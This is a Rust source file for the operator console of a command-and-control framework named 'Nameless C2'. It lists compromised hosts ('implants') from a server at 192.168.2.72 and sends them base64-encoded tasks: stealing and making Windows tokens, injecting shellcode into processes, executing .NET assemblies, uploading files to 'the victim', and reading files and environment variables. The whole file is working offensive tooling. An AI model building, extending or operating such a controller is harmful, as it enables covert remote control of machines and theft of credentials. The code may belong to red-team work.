use std::io::{stdin,stdout, Write};
use std::env;
use prettytable::{Table, Row, Cell};
use serde::{Deserialize, de::IntoDeserializer, Serialize};
use prettytable::row;
use prettytable::format::Alignment::CENTER;
use chrono::{DateTime, Utc, Local, TimeZone};
use std::path::Path;
use base64::encode;
use std::fs::File;
use std::io::Read;
use std::io::BufReader;
use std::process::exit;

#[derive(Deserialize)]
struct DBImplant {
    id: u32,
    implant_id: String,
    username: String,
    domain: String,
    machine: String,
    process: String,
    versionOS: String,
    arch: String,
    pid: String,
    lastcheckin: String,
    dead: String,
    naptime: i32
}

#[derive(Debug, Serialize, Deserialize)]
struct setTask {
    implant_id: String,
    operator_id: String,
    taskcmd: String,
    taskresponse: String,
    completedtask: String,
}

fn epoch_to_datetime(epoch: i64) -> DateTime<Local> {
    Local.timestamp(epoch, 0)
}

fn get_implants(only_alive: &String){

    let req = reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    let _response = req.get("https://192.168.2.72/info").send();

    let body = _response.unwrap().text().unwrap();
    let implants: Vec<DBImplant> = serde_json::from_str(&body).unwrap();
    let mut table = Table::new();

    table.add_row(row![b => Cell::new_align("id", CENTER), Cell::new_align("username", CENTER), Cell::new_align("domain",CENTER), Cell::new_align("machine", CENTER), Cell::new_align("process",CENTER), Cell::new_align("OS Version",CENTER), Cell::new_align("arch",CENTER), Cell::new_align("PID", CENTER), Cell::new_align("last checkin",CENTER)]);

    for implant in implants {
        let datetime = epoch_to_datetime(implant.lastcheckin.parse().unwrap());
        if (implant.dead.eq_ignore_ascii_case("YES")){
            if !only_alive.contains("alive"){
                table.add_row(Row::new(vec![
                    Cell::new_align(&implant.implant_id, CENTER).style_spec("Fr"),
                    Cell::new_align(&implant.username, CENTER).style_spec("Fr"),
                    Cell::new_align(&implant.domain, CENTER).style_spec("Fr"),
                    Cell::new_align(&implant.machine, CENTER).style_spec("Fr"),
                    Cell::new_align(&implant.process, CENTER).style_spec("Fr"),
                    Cell::new_align(&implant.versionOS, CENTER).style_spec("Fr"),
                    Cell::new_align(&implant.arch, CENTER).style_spec("Fr"),
                    Cell::new_align(&implant.pid, CENTER).style_spec("Fr"),
                    Cell::new_align(&datetime.format("%Y-%m-%d %H:%M:%S").to_string(), CENTER).style_spec("Fr"),
                ]));
            }
        }else {
            table.add_row(Row::new(vec![
                Cell::new_align(&implant.implant_id, CENTER).style_spec("Fg"),
                Cell::new_align(&implant.username, CENTER).style_spec("Fg"),
                Cell::new_align(&implant.domain, CENTER).style_spec("Fg"),
                Cell::new_align(&implant.machine, CENTER).style_spec("Fg"),
                Cell::new_align(&implant.process, CENTER).style_spec("Fg"),
                Cell::new_align(&implant.versionOS, CENTER).style_spec("Fg"),
                Cell::new_align(&implant.arch, CENTER).style_spec("Fg"),
                Cell::new_align(&implant.pid, CENTER).style_spec("Fg"),
                Cell::new_align(&datetime.format("%Y-%m-%d %H:%M:%S").to_string(), CENTER).style_spec("Fg"),
            ]));
        }
    }

    table.printstd();
}

fn send_task(implant_ident: String, command: String, operator_name: &String){
    let req = reqwest::blocking::Client::builder().danger_accept_invalid_certs(true).build().unwrap();
    let mut task_req = setTask{implant_id:implant_ident.replace("\r\n", ""), operator_id:operator_name.to_string(), taskcmd:command, taskresponse:"".to_string(), completedtask:"NO".to_string() };
    let mut json_task_req = serde_json::to_string(&task_req).unwrap();
    let _response = req.post("https://192.168.2.72/set_task").header("Content-Type", "application/json" ).body(json_task_req).send();
    println!("Task with task_id: {} sent!", _response.unwrap().text().unwrap());
}

fn implantHandler(implantID: &mut String, operator_name: &String, only_alive: &String){
    print!("[{}]:~$ ", implantID.trim());
    let mut input = String::new();
    stdout().flush().unwrap();
    stdin().read_line(&mut input);
    
    if (input.contains("back")){
        clearscreen::clear().unwrap();
        main_loop(operator_name, only_alive);
    } 
    else if (input.contains("cp")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("pwd")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("ls")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("revtoself")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("maketoken")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("stealtoken")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("ps")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("getenv")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("exit")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("cat")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("primitiveload")) {
        send_task(implantID.to_string(), base64::encode(input.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("help")) {
        println!("HELP Menu:\n
        \tback          - Returns to the Implant menu
        \tls            - Lists directories
        \tps            - Process listing
        \tgetenv        - Get environment variables
        \texit          - Exits the implant process
        \tcat           - Prints the content of files; cat file
        \thelp          - Prints this menu
        \trevtoself     - Reverts to the original token
        \tmaketoken     - Creates a token; maketoken DOMAIN USERNAME PASSWORD
        \tstealtoken    - Steals a token from a process; stealtoken PID
        \tupload        - Uploads file to the victim;upload locationfilesave localfiletoupload\n
        \tcp            - Copy file on victim; cp file1 file2
        \texec-assembly - Executes assemblies;exec-assembly localassemblypath assemblyargs
        \tpwd           - Prints current path\n");
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("exec-assembly")) {
        let mut cmd_parts = input.split_whitespace();
        let exec_cmd = cmd_parts.next().unwrap_or("");
        let assembly = cmd_parts.next().unwrap_or("");
        let assembly_args = cmd_parts.next().unwrap_or("");
        let mut contents = Vec::new();

        if Path::new(assembly).exists() {
            let mut file = File::open(assembly);
            let mut reader = BufReader::new(file.unwrap());
            reader.read_to_end(&mut contents);
        }

        let encoded_cmd = base64::encode(&contents);
        let combined_cmd = format!("{} {} {}", exec_cmd, encoded_cmd, assembly_args);
        send_task(implantID.to_string(), base64::encode(combined_cmd.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("inject")) {
        let mut cmd_parts = input.split_whitespace();
        let exec_cmd = cmd_parts.next().unwrap_or("");
        let pid: &str = cmd_parts.next().unwrap_or("");
        let shellcode = cmd_parts.next().unwrap_or("");
        let mut contents = Vec::new();

        if Path::new(shellcode).exists() {
            let mut file = File::open(shellcode);
            let mut reader = BufReader::new(file.unwrap());
            reader.read_to_end(&mut contents);
        }

        let encoded_cmd = base64::encode(&contents);
        let combined_cmd = format!("{} {} {}",exec_cmd, pid, encoded_cmd);

        send_task(implantID.to_string(), base64::encode(combined_cmd.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input.contains("upload")) {
        let mut cmd_parts = input.split_whitespace();
        let exec_cmd = cmd_parts.next().unwrap_or("");
        let path_to_save: &str = cmd_parts.next().unwrap_or("");
        let file = cmd_parts.next().unwrap_or("");
        let mut contents = Vec::new();

        if Path::new(file).exists() {
            let mut file_data = File::open(file);
            let mut reader = BufReader::new(file_data.unwrap());
            reader.read_to_end(&mut contents);
        }

        let encoded_cmd = base64::encode(&contents);
        let combined_cmd = format!("{} {} {}",exec_cmd, path_to_save, encoded_cmd);
        send_task(implantID.to_string(), base64::encode(combined_cmd.replace("\r\n", "")), operator_name);
        implantHandler(implantID, operator_name, only_alive);
    }
    else if (input != "\r\n"){
        implantHandler(implantID, operator_name, only_alive);
    }
    else {
        implantHandler(implantID, operator_name, only_alive);
    }
}

fn main_loop(operator_name: &String, only_alive: &String){
    get_implants(only_alive);

    loop {
        print!("\r\nImplant ID:~$ ");
        stdout().flush();
        let mut input = String::new();
        stdin().read_line(&mut input);

        if input == "\r\n" {
            clearscreen::clear().unwrap();
            main_loop(operator_name, only_alive);
        }else if (input.contains("back")){
            clearscreen::clear().unwrap();
            main_loop(operator_name, only_alive);
        }

        clearscreen::clear().unwrap();
        implantHandler(&mut input, operator_name, only_alive);
    }
}

fn main() {

    println!(
        r###"███╗   ██╗ █████╗ ███╗   ███╗███████╗██╗     ███████╗███████╗███████╗     ██████╗██████╗ 
████╗  ██║██╔══██╗████╗ ████║██╔════╝██║     ██╔════╝██╔════╝██╔════╝    ██╔════╝╚════██╗
██╔██╗ ██║███████║██╔████╔██║█████╗  ██║     █████╗  ███████╗███████╗    ██║      █████╔╝
██║╚██╗██║██╔══██║██║╚██╔╝██║██╔══╝  ██║     ██╔══╝  ╚════██║╚════██║    ██║     ██╔═══╝ 
██║ ╚████║██║  ██║██║ ╚═╝ ██║███████╗███████╗███████╗███████║███████║    ╚██████╗███████╗
╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚══════╝     ╚═════╝╚══════╝
                                                                                         "###);

    let args: Vec<String> = env::args().collect();

    println!("\r\n");
    println!("[+] Nameless Terminal\r\n");

    if args.len() < 3 {
        println!("Usage: NamelessTerminal <OperatorName> <alive/all>");
        std::process::exit(1);
    }

    let operator_name = &args[1];
    let only_alive = &args[2];
    if !only_alive.contains("alive") && !only_alive.contains("all") {
        println!("[X] Wrong Args Bro!");
        exit(0);
    }

    main_loop(operator_name, only_alive);
}
